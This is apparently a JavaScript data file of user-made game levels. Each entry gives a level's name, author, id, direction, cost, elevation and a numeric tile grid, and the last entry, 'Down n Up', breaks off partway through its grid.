maps.push({name="Quick Shower",author="sivi",id="#1663019199",direction="forward",cost=316,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,1,105,105,1,0,0,0,0,0,0,0,1,132,132,1,0,0,0,0,0,1,105,105,1,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,1,105,105,1,0,0,0,0,0,0,0,1,3,3,1,0,0,0,0,0,1,105,105,1,0,0,0,0,1,1,1,1,9,9,1,1,1,1,0,0,1,105,105,1,0,0,0,0,1,97,90,88,94,94,88,90,97,1,0,0,1,105,105,1,0,0,0,0,1,90,5,5,5,5,5,5,90,1,0,0,1,105,105,1,0,0,0,0,1,13,5,65,65,65,65,5,13,1,0,1,1,127,127,1,1,0,0,0,1,90,5,65,65,65,65,5,90,1,0,1,124,67,67,124,1,0,0,0,1,11,5,65,65,65,65,5,11,1,0,1,124,67,67,124,1,0,0,0,1,90,5,5,5,5,5,5,90,1,0,1,124,67,67,124,1,0,0,0,1,9,90,7,5,5,7,90,9,1,0,1,124,67,67,124,1,0,0,0,1,1,1,1,96,96,1,1,1,1,0,1,124,67,67,124,1,0,0,0,0,1,1,90,105,105,90,1,1,0,0,1,124,67,67,124,1,0,0,0,0,1,90,105,105,105,105,90,1,0,0,1,1,131,131,1,1,0,0,0,0,1,88,105,105,105,105,88,1,0,0,0,1,105,105,1,0,0,0,0,0,1,90,105,105,105,105,90,1,0,0,0,1,93,93,1,0,0,0,0,0,1,1,90,105,105,90,1,1,0,0,0,1,1,1,1,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="CVpaste 1",author="ZpLit",id="#1663035999",direction="forward",cost=106,elevation=5,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,14,14,14,14,67,0,0,0,0,0,0,0,14,14,13,13,13,14,14,14,14,1,1,14,0,0,0,0,0,0,0,0,14,14,13,13,13,14,14,14,14,1,1,14,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,14,14,14,14,67,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,35,35,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,35,35,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,35,35,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,35,35,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,35,35,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,36,36,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,37,37,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,38,38,0,0,0,0,0,0,0,0,0,39,39,0,0,39,0,39,0,39,39,39,39,0,0,0,0,0,0,0,39,39,39,39,0,39,0,39,0,39,39,39,39,0,0,0,0,0,0,0,88,2,2,88,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="CVpaste 2",author="ZpLit",id="#1663037830",direction="forward",cost=546,elevation=0,map=[0,24,24,24,24,24,24,24,24,24,2,2,24,24,24,24,24,24,24,0,24,54,54,54,54,54,20,14,14,14,14,14,14,14,14,14,14,14,90,24,24,54,93,54,100,54,20,92,14,14,14,14,14,14,14,92,14,14,14,24,24,54,54,54,54,54,20,14,14,24,14,14,20,20,20,20,20,20,14,24,24,54,93,54,93,54,20,3,14,24,14,14,20,54,90,54,54,20,14,24,24,54,54,54,54,54,20,14,14,24,14,14,20,54,54,94,54,20,14,24,24,20,54,54,20,20,20,14,14,24,14,14,20,54,54,54,54,20,14,24,24,20,54,54,20,90,14,14,14,14,14,14,20,20,14,14,20,20,14,24,24,20,54,54,20,14,14,90,14,14,14,14,14,14,91,91,14,14,14,24,24,20,54,54,20,20,20,20,14,14,14,14,14,14,14,14,14,14,14,24,24,20,54,54,54,91,54,14,14,14,66,66,66,66,66,66,66,71,14,24,24,20,54,54,54,91,54,14,14,14,71,66,66,66,66,66,66,71,24,24,24,20,20,20,20,20,20,20,14,14,71,66,14,14,66,66,71,71,14,24,24,14,14,24,14,24,14,24,14,14,71,71,90,14,66,66,71,71,24,24,24,14,74,74,74,74,74,74,74,74,71,71,14,14,66,71,71,71,14,24,24,14,74,74,74,74,74,74,74,74,71,71,74,70,71,71,71,71,24,24,24,14,74,74,74,74,74,74,74,74,71,71,71,71,71,71,71,71,14,24,24,14,14,14,14,14,14,14,14,14,14,90,14,14,14,14,14,90,14,24,24,90,14,14,1,14,14,14,14,1,14,14,14,14,90,14,14,14,14,24,0,24,24,24,1,1,2,2,1,1,24,24,24,24,24,24,24,24,24,0]});
maps.push({name="CVpaste 3",author="ZpLit",id="#1663038831",direction="forward",cost=111,elevation=10,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,34,34,34,34,34,34,0,0,0,0,0,0,0,1,0,1,38,37,36,35,34,14,14,14,14,34,0,0,0,0,0,0,0,1,0,1,39,0,0,0,34,14,14,14,14,34,94,0,0,0,0,0,0,1,0,1,39,0,0,0,34,14,14,14,14,34,94,0,0,0,0,0,0,1,0,1,0,0,0,0,34,14,14,14,14,34,0,0,0,0,0,0,0,1,0,1,39,0,0,0,34,34,34,34,34,34,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,93,93,0,0,0,0,0,0,0,0,0,1,0,1,39,40,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,1,1,42,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,43,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,44,44,44,44,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,2,2,44,0,0,0,0,0,0,0,0]});
maps.push({name="CVpaste 4",author="ZpLit",id="#1663041169",direction="forward",cost=117,elevation=4,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,20,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,21,55,55,21,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,22,56,56,22,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,22,22,56,56,22,22,0,0,0,0,0,0,0,1,0,0,1,1,1,23,22,56,56,56,56,22,0,0,0,0,0,0,0,1,0,0,1,58,58,58,57,56,56,56,56,56,36,94,0,0,0,0,0,1,0,0,1,58,58,58,57,56,56,56,56,56,36,94,0,0,0,0,0,1,0,0,1,58,58,23,22,56,56,56,56,22,0,0,0,0,0,0,0,1,1,1,1,58,58,1,22,22,56,56,22,22,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,93,93,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="CVpaste 5",author="ZpLit",id="#1663041910",direction="forward",cost=189,elevation=14,map=[0,0,0,0,0,16,16,16,16,16,16,2,2,0,0,0,0,0,0,0,0,0,0,0,0,16,50,50,50,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,16,50,50,50,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,16,50,50,50,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,16,50,50,50,10,10,10,10,10,10,0,0,0,0,0,0,0,1,1,1,16,110,110,110,10,10,65,65,65,10,0,0,0,0,0,0,0,1,113,112,111,110,110,110,10,10,65,65,65,10,0,0,0,0,0,0,0,1,113,1,1,110,110,110,10,10,65,65,65,10,0,0,0,0,0,0,0,1,114,1,1,1,1,1,10,10,65,65,65,10,0,0,0,0,0,0,0,1,115,115,116,117,118,119,10,10,65,65,65,10,0,0,0,0,0,0,0,1,1,1,1,1,1,119,10,10,65,65,65,10,0,0,0,0,0,0,0,0,1,124,124,1,1,120,10,10,65,65,65,10,0,0,0,0,0,0,0,0,1,124,124,1,1,121,10,10,10,10,10,10,0,0,0,0,0,0,0,0,1,124,124,123,122,122,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Need Big Jumps",author="TF2 Pencil",id="#1663042715",direction="right",cost=235,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,96,96,14,14,14,14,14,14,14,14,14,14,2,0,14,14,14,14,14,14,96,96,14,14,14,14,14,14,14,14,97,14,2,0,14,14,0,0,14,14,0,0,0,0,0,0,0,0,0,0,14,14,0,0,9,9,9,9,3,3,9,9,9,9,9,9,9,9,9,9,9,9,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,14,14,0,0,0,0,9,9,9,9,9,9,0,0,0,0,14,14,0,0,14,14,0,0,0,0,9,9,9,9,9,9,0,0,0,0,14,14,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,14,14,0,0,0,0,9,9,0,0,9,9,0,0,0,0,14,14,0,0,14,14,0,0,0,0,9,9,0,0,9,9,0,0,0,0,14,14,0,0,9,9,9,9,9,9,9,9,0,0,9,9,9,9,9,9,9,9,0,0,9,9,9,9,9,9,9,9,0,0,9,9,9,9,9,9,9,9,0,0,14,14,9,9,14,14,9,9,14,14,9,9,14,14,9,9,14,14,0,0,14,14,9,9,14,14,9,9,14,14,9,9,14,14,9,9,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="How to get up",author="TF2 Pencil",id="#1663042764",direction="right",cost=209,elevation=8,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,18,18,18,18,18,2,0,0,0,0,10,10,0,0,0,0,0,0,0,0,18,97,18,18,18,2,0,0,0,0,10,10,0,0,1,1,1,1,1,1,1,1,18,18,0,0,0,0,0,0,10,10,0,0,1,10,10,10,10,10,10,4,18,18,0,0,0,0,0,0,10,10,0,0,1,10,10,10,10,10,10,4,18,18,0,0,0,0,0,0,10,10,0,0,1,10,10,1,1,1,1,1,96,96,0,0,0,0,0,0,10,10,0,0,1,10,10,10,10,10,10,141,18,96,0,0,0,0,0,0,10,10,10,10,10,10,10,10,10,10,10,141,18,96,0,0,0,0,0,0,10,10,10,10,10,10,10,1,1,1,1,1,18,96,0,0,0,0,0,0,10,10,10,10,10,10,10,10,10,10,10,3,18,96,0,0,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,3,18,96,0,0,0,0,0,0,0,0,0,0,1,10,10,1,1,1,1,1,18,96,0,0,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,92,18,96,0,0,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,92,18,96,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Chance To Skip",author="TF2 Pencil",id="#1663042812",direction="forward",cost=484,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,12,12,1,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,12,12,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,1,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,12,12,1,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,12,12,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,1,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Whats Inside",author="TF2 Pencil",id="#1663042918",direction="right",cost=280,elevation=0,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,11,11,0,1,93,93,93,93,1,18,17,1,93,93,93,93,1,0,0,0,11,11,0,1,89,11,11,89,1,19,16,1,11,89,89,11,1,0,0,0,11,11,0,1,94,94,94,94,1,20,15,1,94,94,94,94,1,0,0,0,11,11,0,1,89,11,11,89,1,21,14,1,11,89,89,11,1,0,0,0,11,11,0,1,11,11,11,11,1,97,0,1,11,11,11,11,1,0,0,0,11,11,0,1,96,1,1,1,1,21,12,1,1,1,1,96,1,0,0,0,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,2,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,2,0,0,0,1,98,1,1,1,1,111,105,1,1,1,1,98,1,0,0,0,0,0,11,1,11,11,11,11,1,0,99,1,11,11,11,11,1,15,0,0,0,0,0,1,89,11,11,89,1,111,105,1,11,89,89,11,1,14,0,0,0,0,11,1,94,94,94,94,1,111,106,1,94,94,94,94,1,13,0,0,0,0,0,1,89,11,11,89,1,110,107,1,11,89,89,11,1,12,0,0,0,0,11,1,93,93,93,93,1,109,108,1,93,93,93,93,1,11,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,100,0,0,0,0,11,0,11,0,11,0,11,0,11,0,11,0,11,0,0,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="CVpaste 6",author="ZpLit",id="#1663043857",direction="forward",cost=195,elevation=-5,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,20,19,14,14,14,14,135,135,135,135,16,100,0,0,0,0,0,24,100,24,21,18,14,14,14,14,135,135,135,135,16,16,0,0,0,0,0,24,24,24,22,17,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,24,24,24,23,16,14,14,14,14,135,135,135,135,14,14,0,0,0,0,0,24,24,24,24,15,14,14,14,14,135,135,135,135,14,14,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,9,9,135,135,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,88,2,2,88,0,0,0,0,0,0,0,0]});
maps.push({name="Around Walls 4",author="TF2 Pencil",id="#1663047487",direction="right",cost=245,elevation=14,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,14,14,14,14,14,14,14,13,12,11,10,9,8,8,8,8,8,0,0,0,14,14,14,14,14,14,14,13,12,11,10,9,8,8,8,8,8,0,0,0,14,14,1,1,1,1,1,1,1,1,1,1,1,1,1,8,8,0,0,0,14,14,1,38,38,0,125,34,1,34,1,34,1,34,14,4,8,0,0,0,14,14,1,3,0,0,0,0,0,0,0,0,0,34,0,0,0,0,0,0,14,14,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,1,3,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,0,14,14,1,3,0,0,131,44,0,44,0,44,44,44,1,132,22,0,0,0,14,14,1,38,0,0,0,0,0,0,0,0,0,42,1,22,22,0,0,0,14,14,1,38,0,0,0,0,0,44,0,0,0,42,1,22,22,0,0,0,14,14,1,0,0,0,0,0,0,97,0,0,0,40,1,22,22,0,0,0,14,14,1,119,119,0,0,0,0,0,0,0,0,40,1,96,96,0,0,0,14,14,1,93,119,119,119,119,119,119,0,0,38,38,1,96,96,0,0,0,14,14,1,1,1,1,1,1,1,1,1,1,1,1,1,96,96,0,0,0,14,14,15,16,17,18,19,20,21,22,22,22,96,96,22,22,22,22,2,0,14,14,15,16,17,18,19,20,21,22,22,22,96,96,22,22,22,22,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Around Walls 5",author="TF2 Pencil",id="#1663047514",direction="right",cost=272,elevation=-15,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,2,0,20,20,0,0,0,0,0,0,0,0,0,0,5,132,5,5,5,5,2,0,20,20,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,0,0,20,20,20,20,1,34,33,32,31,30,29,28,27,26,26,1,5,5,0,0,20,20,1,20,1,0,0,0,0,0,0,0,0,1,26,1,5,5,0,0,20,20,1,127,1,0,0,42,0,0,42,42,40,1,26,1,5,5,0,0,20,20,1,0,1,34,0,44,0,0,0,0,40,1,26,1,5,5,0,0,20,20,1,0,1,36,0,0,0,0,0,0,0,1,28,1,5,5,0,0,20,20,1,0,1,0,0,44,0,0,0,0,0,1,30,1,5,5,0,0,20,20,1,0,1,3,0,44,44,0,0,0,40,1,32,1,5,5,0,0,20,20,1,0,1,38,0,131,97,0,0,0,40,1,34,1,5,5,0,0,20,20,1,40,1,38,1,1,1,1,1,1,39,1,36,1,5,5,0,0,20,20,1,40,1,38,92,0,0,0,0,0,38,1,38,1,5,5,0,0,20,20,1,40,1,1,1,1,1,1,1,1,1,1,40,1,5,5,0,0,96,96,1,40,92,0,0,0,0,0,0,0,0,40,40,1,5,5,0,0,96,96,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,0,0,20,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,0,0,20,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Get More Triggers",author="TF2 Pencil",id="#1663047581",direction="right",cost=586,elevation=0,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,1,0,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,1,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,1,0,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,144,1,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,1,0,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,97,1,1,1,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,96,96,17,2,17,144,17,144,17,144,17,144,17,144,17,144,17,144,17,17,96,96,17,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Dont Hit It",author="TF2 Pencil",id="#1663047630",direction="left",cost=482,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,15,15,130,130,130,130,130,130,15,15,15,130,130,130,130,130,130,15,15,0,15,15,130,130,130,130,1,130,15,15,15,130,130,130,130,130,130,15,15,0,15,15,130,1,130,130,130,130,15,15,15,130,130,1,1,130,130,15,15,0,15,15,130,130,130,130,130,130,15,15,15,130,130,130,130,130,130,15,15,0,15,15,130,130,130,130,1,130,15,15,15,130,130,130,130,130,130,15,15,0,15,15,130,1,130,130,130,130,15,15,15,130,130,1,1,130,130,15,15,0,15,15,130,130,130,130,130,130,15,15,15,130,130,130,130,130,130,15,15,2,15,15,130,130,130,130,1,130,15,15,15,130,130,130,130,130,130,15,15,2,15,15,130,1,130,130,130,130,15,15,15,130,130,1,1,130,130,15,15,0,15,15,130,130,130,130,130,130,15,15,15,130,130,130,130,130,130,15,15,0,15,15,130,130,130,130,1,130,15,15,15,130,130,130,130,130,130,15,15,0,15,15,130,1,130,130,130,130,15,15,15,130,130,1,1,130,130,15,15,0,15,15,130,130,130,130,130,130,15,15,15,130,130,130,130,130,130,15,15,0,15,15,130,130,130,130,1,130,15,15,15,130,130,130,130,130,130,15,15,0,15,15,130,1,130,130,130,130,15,15,15,130,130,1,1,130,130,15,15,0,15,15,130,130,130,130,130,130,15,15,15,130,130,130,130,130,130,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Canyon",author="sivi",id="#1663070030",direction="forward",cost=433,elevation=0,map=[0,0,1,1,1,1,1,1,1,1,1,0,1,1,1,2,2,1,1,1,0,1,1,14,14,1,14,14,14,14,1,1,1,14,141,5,5,141,14,1,0,1,14,90,5,5,90,5,5,5,14,1,1,14,5,5,5,5,14,1,1,1,14,5,5,5,5,5,5,90,14,1,1,14,5,90,5,5,14,1,1,14,5,5,5,5,5,5,5,5,5,14,1,14,5,5,5,5,14,1,1,14,90,5,5,90,14,90,5,5,5,14,1,14,90,5,5,90,1,1,1,14,5,5,5,14,1,14,45,45,45,14,1,1,14,5,5,5,14,1,1,14,5,5,5,14,1,14,95,95,95,1,1,1,14,5,5,5,14,1,1,1,5,90,5,14,1,14,45,45,45,14,1,14,5,5,90,5,14,1,1,14,5,5,5,14,1,14,5,5,5,14,1,14,5,5,5,5,14,1,1,14,45,45,45,14,1,14,90,5,14,1,1,14,45,45,45,14,1,1,1,14,95,95,95,1,1,14,5,5,14,1,1,1,95,95,95,14,1,0,1,14,45,45,45,14,1,14,5,5,14,1,1,14,45,45,45,14,1,1,1,14,5,5,5,14,1,14,5,90,14,1,1,14,5,5,5,5,14,1,1,93,90,5,5,14,1,1,5,5,5,14,14,5,5,90,5,5,1,1,1,1,5,5,90,14,1,14,5,5,5,5,90,5,5,5,5,5,14,1,1,90,5,5,88,14,1,14,90,5,5,5,5,5,5,5,5,90,14,1,1,88,5,5,90,93,1,1,14,5,90,5,5,5,90,5,5,14,1,1,1,90,5,5,5,1,1,1,1,14,14,1,14,14,14,14,14,1,1,0,1,5,2,2,5,1,0,0,1,1,1,1,1,1,1,1,1,1,0,0]});
maps.push({name="Grand Hall",author="sivi",id="#1663099871",direction="forward",cost=434,elevation=6,map=[0,0,0,1,1,1,1,1,1,2,2,1,1,1,1,1,1,0,0,0,0,1,1,1,124,124,124,1,1,5,5,1,1,124,124,124,1,1,1,0,0,1,94,90,67,67,67,90,5,5,5,5,90,67,67,67,90,94,1,0,0,1,5,5,90,88,90,5,5,5,5,5,5,90,88,90,5,5,1,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,0,0,1,90,5,5,90,5,5,90,5,5,90,5,5,90,5,5,90,1,0,0,1,5,5,5,8,5,5,8,5,5,8,5,5,8,5,5,5,1,0,0,1,5,5,5,9,6,6,9,5,5,9,6,6,9,5,5,5,1,0,0,1,90,5,90,10,7,7,10,5,5,10,7,7,10,90,5,90,1,0,0,1,5,5,5,11,8,8,11,5,5,11,8,8,11,5,5,5,1,0,0,1,5,5,5,12,9,9,12,5,5,12,9,9,12,5,5,5,1,0,0,1,90,5,90,13,10,10,13,5,5,13,10,10,13,90,5,90,1,0,0,1,11,11,11,14,11,11,14,45,45,14,11,11,14,11,11,11,1,0,1,1,90,11,11,90,11,11,90,139,139,90,11,11,90,11,11,90,1,1,1,124,67,90,11,11,11,11,93,45,45,93,11,11,11,11,90,67,124,1,1,124,67,88,11,11,11,11,93,45,45,93,11,11,11,11,88,67,124,1,1,124,67,90,11,90,11,11,90,11,11,90,11,11,90,11,90,67,124,1,1,1,90,11,11,11,11,11,11,11,11,11,11,11,11,11,11,90,1,1,0,1,94,11,90,11,11,90,11,11,11,11,90,11,11,90,11,94,1,0,0,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,0]});
maps.push({name="Down n Up",author="sivi",id="#1663111754",direction="right",cost=313,elevation=8,map=[1,10,2,2,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,10,10,10,1,1,90,93,90,1,0,0,0,0,0,0,0,0,0,0,1,10,90,10,1,1,110,110,110,1,0,0,0,0,0,0,0,0,0,0,1,10,10,10,1,1,5,5,5,1,0,0,0,0,0,0,0,0,0,0,1,10,90,10,1,1,5,132,5,1,0,0,0,0,0,0,0,0,0,0,1,10,10,10,1,1,3,5,3,1,0,0,0,0,0,0,0,0,0,0,1,10,90,10,1,1,110,110,110,1,1,1,1,1,1,1,1,1,0,0,1,10,10,10,1,1,50,50,50,116,90,116,116,10,10,10,10,1,0,0,1,10,10,10,1,1,50,90,50,116,116,116,116,10,10,133,10,1,0,0,1,5,5,5,1,1,50,50,50,116,90,116,116,10,10,10,10,1,0,0,1,5,5,5,1,1,10,10,10,1,1,1,1,1,1,1,1,1,0,0,1,5,131,5,